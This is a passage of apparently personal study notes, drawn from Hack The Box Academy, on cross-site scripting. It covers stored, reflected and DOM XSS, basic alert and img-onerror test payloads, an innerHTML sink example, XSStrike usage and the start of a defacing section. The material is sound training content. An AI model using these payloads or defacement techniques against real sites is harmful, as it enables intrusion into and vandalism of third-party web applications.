@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>XSS (Cross-Site Scripting)</title>
+    <meta name="description" content="Software Development | AppSec | Bug Bounty">
+    <meta name="keywords" content=''>
+
+    <meta property="og:url" content="http://192.168.0.19:1313/notas/htb_academy/xss/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="XSS (Cross-Site Scripting)">
+    <meta property="og:description" content="Software Development | AppSec | Bug Bounty">
+    <meta property="og:image" content="http://192.168.0.19:1313/img/me.jpg">
+    <meta property="og:image:secure_url" content="http://192.168.0.19:1313/img/me.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="XSS (Cross-Site Scripting)">
+    <meta name="twitter:description" content="Software Development | AppSec | Bug Bounty">
+    <meta property="twitter:domain" content="http://192.168.0.19:1313/notas/htb_academy/xss/">
+    <meta property="twitter:url" content="http://192.168.0.19:1313/notas/htb_academy/xss/">
+    <meta name="twitter:image" content="http://192.168.0.19:1313/img/me.jpg">
+
+    
+    <link rel="canonical" href="http://192.168.0.19:1313/notas/htb_academy/xss/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.893af8dd3b65bd0ffe90e7af33847bd6dc9180b8fa6d6659a212a6f4b62d3e01.js" integrity="sha256-iTr43TtlvQ/&#43;kOevM4R71tyRgLj6bWZZohKm9LYtPgE="></script>
+
+    
+    
+        <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css" integrity="sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js" integrity="sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          // customised options
+          // • auto-render specific keys, e.g.:
+          delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+          ],
+          // • rendering keys, e.g.:
+          throwOnError : false
+        });
+      });
+    </script>
+  
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="http://192.168.0.19:1313/">
+                <img src='/img/me.jpg' alt="avatar">
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="http://192.168.0.19:1313/">kauan.m</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="http://192.168.0.19:1313/notas/"> ~/notas </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://192.168.0.19:1313/artigos/"> ~/artigos </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://192.168.0.19:1313/writeups/"> ~/writeups </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target"></span>
+                <a>
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="http://192.168.0.19:1313/notas/"> ~/notas </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://192.168.0.19:1313/artigos/"> ~/artigos </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://192.168.0.19:1313/writeups/"> ~/writeups </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a>
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    
+
+    <div class="post container">
+
+    <div class="post-header-section">
+        <h1>XSS (Cross-Site Scripting)</h1>
+    </div>
+
+    <div class="post-content">
+        <h2 id="introduction">Introduction</h2>
+<p>As web applications become more advanced and more common, so do web application vulnerabilities. Among the most common types of web application vulnerabilities are <strong>XSS (Cross-Site Scripting)</strong> vulnerabilities. XSS vulnerabilities take advantage of a flaw in user input sanitization to &ldquo;write&rdquo; JavaScript code to the page and execute it on the client side, leading to several types of attacks.</p>
+<h3 id="what-is-xss">What is XSS?</h3>
+<p>A typical web application works by receiving the HTML code from the backend server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code</p>
+<p>XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (<code>low impact + high probability = medium risk</code>), which we should always attempt to <strong>reduce</strong> risk by detecting, remediating, and proactively preventing these types of vulnerabilities.</p>
+<p>　</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_risk_chart_1.jpg" alt="Impact x Probability"></p>
+<p>　</p>
+<h3 id="xss-attacks">XSS Attacks</h3>
+<p>XSS vulnerabilities can facilitate a wide range of attacks, which can be anything that can be executed through browser JavaScript code. A basic example of an XSS attack is having the target user unwittingly send their session cookie to the attacker&rsquo;s web server.</p>
+<p>As XSS attacks execute JavaScript code within the browser, they are limited to the browser&rsquo;s JS engine (e.g., V8 in Chrome). They cannot execute system-wide JavaScript code to do something like system-level code execution. In modern browsers, they are also limited to the same domain of the vulnerable website. Nevertheless, being able to execute JavaScript in a user&rsquo;s browser may still lead to a wide variety of attacks, as mentioned above. In addition to this, if a skilled researcher identifies a binary vulnerability in a web browser (e.g., a Heap overflow in Chrome), they can use an XSS vulnerability to execute a JavaScript exploit on the target&rsquo;s browser, which eventually breaks out of the browser&rsquo;s sandbox and executes code on the user&rsquo;s machine.</p>
+<p>XSS vulnerabilities may be found in almost all modern web applications and have been actively exploited for the past two decades.</p>
+<h3 id="types-of-xss">Types of XSS</h3>
+<p>There are three main types of XSS vulnerabilities:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Stored XSS</strong></td>
+<td>The most critical type of XSS, which occurs when user input is stored on the backend database and then displayed upon retrieval (e.g., posts or comments)</td>
+</tr>
+<tr>
+<td><strong>Reflected XSS</strong></td>
+<td>Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)</td>
+</tr>
+<tr>
+<td><strong>DOM-based XSS</strong></td>
+<td>Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)</td>
+</tr>
+</tbody>
+</table>
+<p>　</p>
+<h2 id="stored-xss">Stored XSS</h2>
+<p>The first and most critical type of XSS vulnerability is <strong>Stored XSS</strong> or <strong>Persistent XSS</strong>. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this menas that our XSS attack is persistent and may affect any user that visits the page.</p>
+<p>This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.</p>
+<p>We can start the server below to view and practice a Stored XSS example. As we can see, the web page is a simple To-Do List app that we can add items to. We can try typing test and hitting enter/return to add a new item and see how the page handles it:</p>
+<p>　</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_stored_xss.jpg" alt="To-Do List"></p>
+<p>　</p>
+<p>As we can see, our input was displayed on the page. If no sanitization or filtering was applied to our input, the page might be vulnerable to XSS.</p>
+<h3 id="xss-testing-payloads">XSS Testing Payloads</h3>
+<p>We can test whether the page is vulnerable to XSS with the following basic XSS payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(window.<span style="color:#a6e22e">origin</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed. Suppose the page allows any input and does not perform any sanitization on it. In that case, the alert should pop up with the URL of the page it is being executed on, directly after we input our payload or when we refresh the page.</p>
+<p>As we can see, we did indeed get the alert, which means that the page is vulnerable to XSS, since our payload executed successfully. We can confirm this further by looking at the page source by clicking <code>Ctrl+U</code> or right-clicking and selecting <code>View Page Source</code>, and we should see our payload in the page source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">ul</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;list-unstyled&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;todo&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(window.<span style="color:#a6e22e">origin</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">ul</span>&gt;
+</span></span></code></pre></div><blockquote>
+<p><strong>TIP</strong>: many modern web applications use cross-domain iFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of <code>window.origin</code> in the alert box, instead of a static value like <code>1</code>. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an iFrame was being used.</p>
+</blockquote>
+<p>As some modern browsers may block the <code>alert()</code> JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is <code>&lt;plaintext&gt;</code>, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is <code>&lt;script&gt;print()&lt;/script&gt;</code> that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.</p>
+<p>To see whether the payload is persistent and stored on the back-end, we can refresh the page and see whether we get the alert again. If we do, we would see that we keep getting the alert even throughout page refreshes, confirming that this is indeed a <code>Stored XSS</code> vulnerability. This is not unique to us, as any user who visits the page will trigger the XSS payload and get the same alert.</p>
+<p>　</p>
+<h2 id="reflected-xss">Reflected XSS</h2>
+<p>There are two types of <strong>Non-Persistent XSS</strong> vulnerabilities: <strong>Reflected XSS</strong>, which gets processed by the backend server, and <strong>DOM-based XSS</strong>, which is completely processed on the client-side and never reaches the back-end server. Unlike Persistent XSS, <strong>Non-Persistent XSS</strong> vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page.</p>
+<p><strong>Reflected XSS</strong> vulnerabilities occur when our input reaches the backend server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are <strong>Non-Persistent</strong>.</p>
+<p>We can start the server below to practice on a web page vulnerable to a Reflected XSS vulnerability. It is a similar To-Do List app to the one we practiced with in the previous section. We can try adding any test string to see how it&rsquo;s handled:</p>
+<p>　</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_reflected_1.jpg" alt=""></p>
+<p>　</p>
+<p>As we can see, we get <code>Task 'test' could not be added.</code>, which includes our input <code>test</code> as part of the error message. If our input was not filtered or sanitized, the page might be vulnerable to XSS. We can try the same XSS payload we used in the previous section and click <code>Add</code>.</p>
+<p>　</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_reflected_2.jpg" alt=""></p>
+<p>　</p>
+<p>Once we click <code>Add</code>, we get the alert pop-up:</p>
+<p>　</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg" alt=""></p>
+<p>　</p>
+<p>In this case, we see that the error message now says <code>Task '' could not be added.</code>. Since our payload is wrapped with a <code>&lt;script&gt;</code> tag, it does not get rendered by the browser, so we get empty single quotes <code>''</code> instead. We can once again view the page source to confirm that the error message includes our XSS payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">ul</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;list-unstyled&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;todo&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;padding-left:25px&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                Task &#39;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(window.<span style="color:#a6e22e">origin</span>)&lt;/<span style="color:#f92672">script</span>&gt;&#39; could not be added.
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>    ...
+</span></span></code></pre></div><p>As we can see, the single quotes indeed contain our XSS payload <code>'&lt;script&gt;alert(window.origin)&lt;/script&gt;'</code>. If we visit the <code>Reflected</code> page again, the error message no longer appears, and our XSS payload is not executed, which means that this XSS vulnerability is indeed <strong>Non-Persistent</strong>.</p>
+<blockquote>
+<p>But if the XSS vulnerability is Non-Persistent, how would we target victims with it?</p>
+</blockquote>
+<p>This depends on which HTTP request is used to send our input to the server. We can check this through the Firefox <code>Developer Tools</code> by clicking <code>Ctrl+I</code> and selecting the <code>Network</code> tab. Then, we can put our <code>test</code> payload again and click <code>Add</code> to send it:</p>
+<p>　</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_reflected_network.jpg" alt=""></p>
+<p>　</p>
+<p>As we can see, the first row shows that our request was a <code>GET</code> request. <code>GET</code> request sends their parameters and data as part of the URL. So, <strong>to target a user, we can send them a URL containing our payload</strong>. To get the URL, we can copy the URL from the URL bar after sending our XSS payload.</p>
+<p>　</p>
+<h2 id="dom-xss">DOM XSS</h2>
+<p>The third and final type of XSS is another <strong>Non-Persistent</strong> type called <strong>DOM-based XSS</strong>. While <strong>reflected XSS</strong> sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the <strong>DOM (Document Object Model)</strong>.</p>
+<p>We can run the server below to see an example of a web application vulnerable to DOM XSS. we can try adding a <code>test</code> item, and we see that the web application is similar to the <code>To-Do List</code> web applications we previously used. However, if we open the <code>Network</code> tab in the Developer Tools, and re-add the <code>test</code> item, we would notice that no HTTP requests are being made.</p>
+<p>　</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_dom_network.jpg" alt=""></p>
+<p>　</p>
+<p>We see that the input parameter in the URL is using a hashtag <code>#</code> for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the backend; hence it is a <strong>DOM-based XSS</strong>.</p>
+<p>Furthermore, if we look at the page source by hitting <code>Ctrl+U</code>, we will notice that our <code>test</code> string is nowhere to be found. This is because the JavaScript code is updating the page when we click the <code>Add</code> button, which is after the page source is retrieved by our browser, hence the base page source will not show our input, and if we refresh the page, it will ont be retained (i.e. Non-Persistent).</p>
+<p>We can still view the rendered page source with the Web Inspector tool by clicking <code>Ctrl+Shift+C</code>.</p>
+<h3 id="source--sink">Source &amp; Sink</h3>
+<p>To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the <strong>Source</strong> and <strong>Sink</strong> of the object displayed on the page. The <strong>Source</strong> is <strong>the JavaScript object that takes the user input</strong>, and it can be any input parameter like a URL parameter or an input field, as we saw above.</p>
+<p>On the other hand, the <strong>Sink</strong> is <strong>the function that writes the user input to a DOM Object on the page</strong>. If the <strong>Sink</strong> function does not properly sanitize the user input, it would be vulnerable to an XSS attack.</p>
+<p>Some of the commonly used JavaScript functions to write to DOM objects are:</p>
+<ul>
+<li><code>document.write()</code></li>
+<li><code>DOM.innerHTML</code></li>
+<li><code>DOM.outerHTML</code></li>
+</ul>
+<p>Furthermore, some of the <strong>jQuery</strong> library functions that write to DOM objects are:</p>
+<ul>
+<li><code>add()</code></li>
+<li><code>after()</code></li>
+<li><code>append()</code></li>
+</ul>
+<p>If a <strong>Sink</strong> function writes the exact input without any sanitization (like the above functions), and no other means of sanitization were used, then we know that the page should be vulnerable to XSS.</p>
+<p>We can look at the source code of the <code>To-Do</code> web application, and check <code>script.js</code>, and we will see that the <code>Source</code> is being taken from the <code>task=</code> parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pos</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;task=&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">task</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#a6e22e">pos</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>, document.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">length</span>);
+</span></span></code></pre></div><p>Right below these lines, we see that the page uses the <code>innerHTML</code> function to write the <code>task</code> variable the <code>todo</code> DOM:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;todo&#34;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;b&gt;Next Task:&lt;/b&gt; &#34;</span> <span style="color:#f92672">+</span> decodeURIComponent(<span style="color:#a6e22e">task</span>);
+</span></span></code></pre></div><p>So, we can see that we can control the input, and the output is not being sanitized, so this page should be vulnerable to DOM XSS.</p>
+<h3 id="dom-attacks">DOM Attacks</h3>
+<p>If we trythe XSS payload we have been using previously, we will see that it will not execute. This is because the <code>innerHTML</code> function does not allow the use of the <code>&lt;script&gt;</code> tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain <code>&lt;script&gt;</code> tags, like the following XSS payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(window.origin)</span>&gt;
+</span></span></code></pre></div><p>The above line creates a new HTML image object, which has a <code>onerror</code> attribute that can execute JavaScript code when the image is not found. So, as we provided an empty image link (<code>&quot;&quot;</code>), our code should always get executed without having to use <code>&lt;script&gt;</code> tags:</p>
+<p>　</p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_dom_alert.jpg" alt=""></p>
+<p>　</p>
+<p>To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. Both of these payloads are among the most basic XSS payloads. There are many instances where we may need to use various payloads depending on the security of the web application and the browser.</p>
+<p>　</p>
+<h2 id="xss-discovery">XSS Discovery</h2>
+<p>In this section, we will go through various ways of detecting XSS vulnerabilities within a web application. In web application vulnerabilities (and all vulnerabilities in general), detecting them can become as difficult as exploiting them. However, as XSS vulnerabilities are widespread, many tools can help us in detecting and identifying them.</p>
+<h3 id="automated-discovery">Automated Discovery</h3>
+<p>Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities. These scanners usually do two types of scanning:</p>
+<ul>
+<li><strong>Passive Scan</strong>: reviews client-side code for potential DOM-based vulnerabilities</li>
+<li><strong>Active Scan</strong>: sends various types of payloads to attempt to trigger an XSS through payload injection in the page source</li>
+</ul>
+<p>Such tools usually work by identifying input fields in web pages, sending various types of XSS payloads, and then comparing the rendered page source to see if the same payload can be found in it, which may indicate a successful XSS injection. Still, this will not always be accurate, as sometimes, even if the same payload was injected, it might not lead to a successful execution due to various reasons, so we must always manually verify the XSS injection.</p>
+<p>Some of the common open-source tools that can assist us in XSS discovery are <code>XSS Strike</code>, <code>Brute XSS</code>, and <code>XSSer</code>. We can try <code>XSS Strike</code> by cloning it to our VM with <code>git clone</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git clone https://github.com/s0md3v/XSStrike.git
+</span></span><span style="display:flex;"><span>$ cd XSStrike
+</span></span><span style="display:flex;"><span>$ pip install -r requirements.txt
+</span></span><span style="display:flex;"><span>$ python xsstrike.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>XSStrike v3.1.4
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><p>We can then run the script and provide it a URL with a parameter using <code>-u</code>. Let&rsquo;s try using it with our reflected XSS example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python xsstrike.py -u <span style="color:#e6db74">&#34;http://SERVER_IP:PORT/index.php?task=test&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        XSStrike v3.1.4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Checking <span style="color:#66d9ef">for</span> DOM vulnerabilities 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> WAF Status: Offline 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Testing parameter: task 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Reflections found: <span style="color:#ae81ff">1</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Analysing reflections 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Generating payloads 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Payloads generated: <span style="color:#ae81ff">3072</span> 
+</span></span><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Payload: &lt;HtMl%09onPoIntERENTER+<span style="color:#f92672">=</span>+confirm<span style="color:#f92672">()</span>&gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Efficiency: <span style="color:#ae81ff">100</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Confidence: <span style="color:#ae81ff">10</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Would you like to <span style="color:#66d9ef">continue</span> scanning? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>As we can see, the tool identified the parameter as vulnerable to XSS from the first payload. <strong>Try to verify the above payload by testing it on one of the previous exercises. You may also try testing out the other tools and run them on the same exercises to see how capable they are in detecting XSS vulnerabilities</strong>.</p>
+<h3 id="manual-discovery">Manual Discovery</h3>
+<p>When it comes to manual XSS discovery, the difficulty of finding the XSS vulnerability depends on the level of security of the web application. Basic XSS vulnerabilities can usually be found through testing various XSS payloads, but identifying advanced XSS vulnerabilities required advanced code review skills.</p>
+<h4 id="xss-payloads">XSS Payloads</h4>
+<p>The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page. We can find huge lists of XSS payloads online, like the one on <code>PayloadAllTheThings</code> or the one in <code>PayloadBox</code>. We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.</p>
+<blockquote>
+<p>Note: XSS can be injected into <strong>ANY INPUT</strong> in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the <code>Cookie</code> or <code>User-Agent</code> (i.e., when their values are displayed on the page).</p>
+</blockquote>
+<p>You will notice that the majority of the above payloads do not work with our example web applications, even though we are dealing with the most basic type of XSS vulnerabilities. This is because these payloads are written for a wide variety of injection points (like injecting after a single quote) or are designed to evade certain security measures (like sanitization filters). Furthermore, such payloads use a variety of injection vectors to execute JavaScript code, like basic <code>&lt;script&gt;</code> tags, other <strong>HTML Attributes</strong> like <code>&lt;img&gt;</code>, or even <strong>CSS style</strong> attributes. This is why we can expect that many of these payloads will not work in all test cases, as they are designed to work with certain types of injections.</p>
+<p>This is why it is not very efficient to resort to manually copying/pasting XSS payloads, as even if a web application is vulnerable, it may take us a while to identify the vulnerability, especially if we have many input fields to test. This is why it may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered. This way, we would have the advantage of customizing our tool to our target web application.</p>
+<h4 id="code-review">Code Review</h4>
+<p>The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both backend and frontend code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.</p>
+<p>In the previous section, we looked at a basic example of HTML code review when discussing the <strong>Source</strong> and <strong>Sink</strong> for DOM-based XSS vulnerabilities. This gave us a quick look at how front-end code review works in identifying XSS vulnerabilities, although on a very basic frontend example.</p>
+<p>We are unlikely to find any XSS vulnerabilities through payload lists or XSS tools for the more common web applications. This is because the developers of such web applications likely run their application through vulnerability assessment tools and then patch any identified vulnerabilities before release. For such cases, manual code review may reveal undetected XSS vulnerabilities, which may survive public releases of common web applications. These are also advanced techniques that are out of the scope of this module.</p>
+<p>　</p>
+<h2 id="defacing">Defacing</h2>
+<p>One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. <strong>Defacing</strong> a website means changing its look for anyone who visits the website. It is very common for hacker groups to deface a website to claim that they had successfully hacked it, like when hackers defaced the UK&rsquo;s NHS back in 2018. Such attacks can carry great media echo and may significantly affect a company&rsquo;s investments and share prices, especially for banks and technology firms.</p>
+<p>Although many other vulnerabilities may be used to achieve the same thing, stored XSS vulnerabilities are among the most used vulnerabilities for doing so.</p>
+<h3 id="defacement-elements">Defacement Elements</h3>
+<p>We can use injected JavaScript code (through XSS) to make a web page look any way we like. However, defacing a website is usually used to send a simple message (i.e., we successfully hacked you), so giving the defaced web page a beautiful look isn&rsquo;t really the primary target.</p>
+<p>Three HTML elements are usually used to change the main look of a web page:</p>
+<ul>
+<li>Background Color: <code>document.body.style.background</code></li>
+<li>Background: <code>document.body.background</code></li>
+<li>Page Title: <code>document.title</code></li>
+<li>Page Text: <code>DOM.innerHTML</code></li>
+</ul>
+<p>We can use two or three of these elements to write a basic message to the web page and even remove the vulnerable element, such that it would be more difficult to quickly reset the web page, as we will see next.</p>
+<p><strong>Changing background</strong></p>
